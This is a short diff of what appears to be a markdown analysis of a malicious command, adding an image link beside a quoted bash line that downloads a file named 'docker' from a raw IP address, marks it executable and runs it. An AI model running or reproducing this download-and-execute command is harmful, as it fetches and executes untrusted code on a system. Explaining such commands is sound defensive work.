@@ -167,7 +167,7 @@ The relevant command was:
 ```bash
 curl -s -o /tmp/docker http://128.199.52.72/docker; chmod +x /tmp/docker; ./tmp/docker
 ```
-
+![](image_2026-11-20_194033167.png)
 This command attempts to:
 
 1. Download a file named `docker` from `128.199.52.72`.
